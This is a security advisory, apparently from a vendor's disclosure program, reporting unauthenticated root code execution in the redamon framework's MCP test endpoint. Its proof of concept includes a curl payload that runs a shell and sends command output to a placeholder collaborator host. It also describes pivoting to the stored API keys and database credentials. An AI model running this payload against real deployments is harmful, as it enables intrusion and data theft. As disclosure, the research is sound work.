<div align="center">
  <a href="https://www.thoropass.com/" target="_blank" rel="noopener noreferrer">
    <img src="https://github.com/user-attachments/assets/b3bbec80-2537-4578-889e-18eaad0d1194" width="150" alt="Thoropass Logo">
  </a>
  <br><br>
  <a href="https://www.thoropass.com/talk-to-an-expert" target="_blank" rel="noopener noreferrer">
    <img src="https://img.shields.io/badge/🌐_WEBSITE-THOROPASS-0078D4?style=for-the-badge" alt="Website">
  </a>
  <a href="https://www.linkedin.com/company/thoropass/" target="_blank" rel="noopener noreferrer">
    <img src="https://img.shields.io/badge/LINKEDIN-CONNECT-0077B5?style=for-the-badge&logo=linkedin&logoColor=white" alt="LinkedIn">
  </a>

  <h1>Unauthenticated Remote Code Execution in redamon</h1>

  <p>🔐 <strong>Thoropass Vulnerability Research Program</strong> 🧪</p>
</div>

<div align="center">
<img src="https://img.shields.io/badge/CVE-Pending-7ED957?style=for-the-badge" alt="Status: Disclosed">
  <img src="https://img.shields.io/badge/SEVERITY-CRITICAL_9.8-FF4444?style=for-the-badge" alt="Severity">
  <img src="https://img.shields.io/badge/TYPE-UNAUTH_RCE-9B59B6?style=for-the-badge" alt="Type">
</div>

---

## Advisory Information

| &nbsp; | &nbsp; |
|:---|:---|
| **Researcher** | [Natan Morette](https://www.linkedin.com/in/nmmorette/) on behalf of [Thoropass](https://thoropass.com) |
| **Product** | [redamon](https://github.com/samugit83/redamon) - AI-driven autonomous red team framework that chains recon, exploitation, and remediation |
| **Affected Version** | All releases through 5.3.1 (master HEAD `b869e8d`, 2026-07-05). Confirmed on 5.2.1 and 5.3.1. Upstream git tags stop at `v5.1.0`; releases 5.1.1 through 5.3.1 ship as untagged master commits. |
| **Endpoint** | `agentic/api.py`, `POST /mcp/test` and `POST /mcp/reload` (agent service, `0.0.0.0:8090`) |
| **Vulnerability Type** | CWE-306: Missing Authentication for Critical Function (leading to CWE-94 arbitrary code execution) |
| **CVE ID** | *Pending assignment* |


## Vulnerability Summary

The redamon `agent` service exposes an unauthenticated HTTP API on `0.0.0.0:8090`. The MCP-server management endpoints `POST /mcp/test` and `POST /mcp/reload` accept a caller-supplied MCP server definition whose `command` and `args` fields are handed to a subprocess launcher with no authentication and no command allowlist. Any client that can reach the port can execute an arbitrary program, as root, inside the agent container. The container also holds `INTERNAL_API_KEY`, the secret that bypasses the webapp authentication middleware, plus `DATABASE_URL`, and it shares the internal `redamon` bridge network, so code execution here pivots to full webapp privilege and the datastores.


## Technical Analysis

### Vulnerable Code

**File:** `agentic/api.py`, lines **120** (auth posture) and **1385-1449** (sink)

The agent app installs a CORS middleware and no authentication dependency on any route:

```python
# agentic/api.py:120
app.add_middleware(
    CORSMiddleware,
    allow_origins=_cors_origins,
    allow_credentials=False,
    allow_methods=["*"],
    allow_headers=["*"],
)
```

`POST /mcp/test` accepts an untyped `dict` from the request body and spawns the stdio server it describes:

```python
# agentic/api.py:1385
@app.post("/mcp/test", tags=["MCP"])
async def test_mcp_server(server: dict):
    srv_obj = mcp_registry.MCPServer.model_validate(server)
    config_dict, env_warnings = mcp_registry.to_mcp_servers_dict([srv_obj])
    ...

# agentic/api.py:1449
proc = subprocess.Popen(
    [srv_obj.command, *list(srv_obj.args or [])],
    env=spawn_env,
    cwd=srv_obj.cwd or None,
    ...
)
```

`MCPServer.command` is a free-form string with no allowlist (`agentic/mcp_registry.py:99,113`); the only check is that stdio transport requires it to be non-empty.

### Root Cause

Two independent failures combine into unauthenticated RCE. First, the agent service has no authentication: the only middleware is CORS, and no route declares an auth dependency, so every endpoint answers anonymous callers. Second, `POST /mcp/test` and `POST /mcp/reload` treat the request body as an MCP server definition and launch its `command` as a subprocess for the stdio transport (both the langchain `MultiServerMCPClient` connect and the diagnostic path at line 1449 spawn it), with no allowlist restricting which binary may run. Because `command` and `args` come straight from the body, the caller chooses the exact program and arguments. The service is published on `0.0.0.0:8090` in `docker-compose.yml` (`"${AGENT_PORT:-8090}:8080"`, no loopback bind). The 5.3.1 release hardened the Kali MCP tool servers and bound the datastores to loopback, but explicitly kept `8090` routable and never added authentication to this endpoint.


## Proof of Concept

Prerequisite: a running redamon deploy (`./redamon.sh up`) reachable on `TARGET:8090`.

**Step 1. Confirm the service is unauthenticated.** An anonymous request reaches the MCP API:

```bash
curl -s -o /dev/null -w "%{http_code}\n" http://TARGET:8090/mcp/manifest
# -> 200
```

**Step 2. Exploit.** Unauthenticated `POST /mcp/test` with an attacker-chosen `command`. The injected shell base64-encodes `id` and calls back to a collaborator (Burp Collaborator, interactsh, or any HTTP catcher the target can reach):

```bash
curl -sk -X POST http://TARGET:8090/mcp/test \
  -H 'Content-Type: application/json' \
  -d '{"id":"poc","name":"poc","transport":"stdio","command":"/bin/sh",
       "args":["-c","D=$(id | base64 | tr -d \n); curl -s http://COLLABORATOR/redamon-rce?d=$D&h=$(hostname)"]}'
```

**Step 3. Confirm out-of-band.** The injected command runs on every call, so the callback is reliable. The collaborator receives it (twice: once via the MCP client connect, once via the diagnostic spawn):

```
GET http://COLLABORATOR/redamon-rce?d=dWlkPTAocm9vdCkgZ2lkPTAocm9vdCkgZ3JvdXBzPTAocm9vdCkK&h=dc53a4ffd7bd
```

Decoding the exfiltrated `d` parameter proves execution as root:

```bash
echo 'dWlkPTAocm9vdCkgZ2lkPTAocm9vdCkgZ3JvdXBzPTAocm9vdCkK' | base64 -d
# uid=0(root) gid=0(root) groups=0(root)
```

![Unauthenticated RCE confirmed out-of-band: the exploit callback lands on the collaborator and the base64 payload decodes to uid=0(root)](rce-oob-collaborator.png)

The `/mcp/test` response also opportunistically reflects the command's stderr in its `error` field, which gives an in-band read primitive with no attacker infrastructure (writing output to stderr returns it in the HTTP response). This channel is race-dependent, so the out-of-band callback above is the reliable confirmation. A full reverse shell is achievable by setting `args` to a shell one-liner. The screenshot below shows the complete local chain: exposure on `0.0.0.0:8090`, the anonymous `200` on `/mcp/manifest`, the `POST /mcp/test` exploit, and the root marker inside the container.

![Exposure on 0.0.0.0:8090, anonymous /mcp/manifest returns 200, POST /mcp/test spawns /bin/sh, and the marker shows uid=0(root)](rce-local-chain.png)


## Impact

- **Unauthenticated remote code execution as root**: any client that reaches `TARGET:8090` runs arbitrary programs as `uid=0` inside the agent container, with no credentials. Confirmed live on 5.3.1, the latest master build.
- **Webapp authentication bypass by pivot**: the agent environment carries `INTERNAL_API_KEY`, which the webapp middleware honors as an internal-service bypass (`webapp/src/middleware.ts:45-49`). Reading it after RCE grants webapp-privileged access to every project and user.
- **Datastore access**: the agent holds `DATABASE_URL` (Postgres) and reaches Neo4j over the shared `redamon` bridge network, exposing all stored scan data, findings, and user records.
- **Offensive tooling takeover**: the agent drives the framework's scanners, tunnels, and container orchestration, so a compromised host becomes a launch point for attacker-directed nmap, nuclei, and metasploit activity.
- **Reachable on the latest release**: the maintainer fixed the same missing-authentication class on the recon-orchestrator (5.1.0) and on the Kali MCP servers (5.3.1), but the agent service was not covered by either fix and remains exposed.


## References

- [CWE-306: Missing Authentication for Critical Function](https://cwe.mitre.org/data/definitions/306.html)
- [CWE-94: Improper Control of Generation of Code ('Code Injection')](https://cwe.mitre.org/data/definitions/94.html)
- [OWASP API Security Top 10 2023 - API2:2023 Broken Authentication](https://owasp.org/API-Security/editions/2023/en/0xa2-broken-authentication/)


## ⚠️ Disclaimer

The vulnerability was identified through authorized security testing. The proof of concept is provided to help defenders validate their exposure and verify remediation.

Thoropass follows **coordinated vulnerability disclosure (CVD)** principles. Vulnerabilities are reported privately to maintainers, reasonable time is provided for remediation, and public advisories are released after coordination or fix availability.


## About Thoropass
Thoropass delivers enterprise-grade audits with AI-native speed and precision. Designed from day one to integrate auditors, automation, and infosec workflows in a single, closed-loop system, no add-ons, no handoffs.

Our experienced penetration testing team proactively discovers vulnerabilities in web applications, APIs, and infrastructure, helping organizations secure their systems before attackers find weaknesses.

<div align="center">
  <br>

  **Thoropass Vulnerability Research Program**

  <em>Improving ecosystem security through responsible research and disclosure.</em>

  <br><br>
  <a href="https://thoropass.com/contact" target="_blank" rel="noopener noreferrer">
    <img src="https://img.shields.io/badge/🔒_Request_a_Penetration_Test-Get_Started-7ED957?style=for-the-badge" alt="Request Pentest">
  </a>
  <br><br>
  <a href="https://www.thoropass.com/platform/penetration-testing" target="_blank" rel="noopener noreferrer">
    <img src="https://img.shields.io/badge/🌐_WEBSITE-THOROPASS-0078D4?style=for-the-badge" alt="Website">
  </a>
  <a href="https://www.linkedin.com/company/thoropass/" target="_blank" rel="noopener noreferrer">
    <img src="https://img.shields.io/badge/LINKEDIN-CONNECT-0077B5?style=for-the-badge&logo=linkedin&logoColor=white" alt="LinkedIn">
  </a>
</div>

---

<div align="center">
  <br><br>
  <a href="https://www.thoropass.com/talk-to-an-expert" target="_blank" rel="noopener noreferrer">
    <img width="100%" alt="Thoropass" src="https://github.com/user-attachments/assets/557c3c6e-bc2d-4b0e-90cb-503767a0aa23">
  </a>
</div>
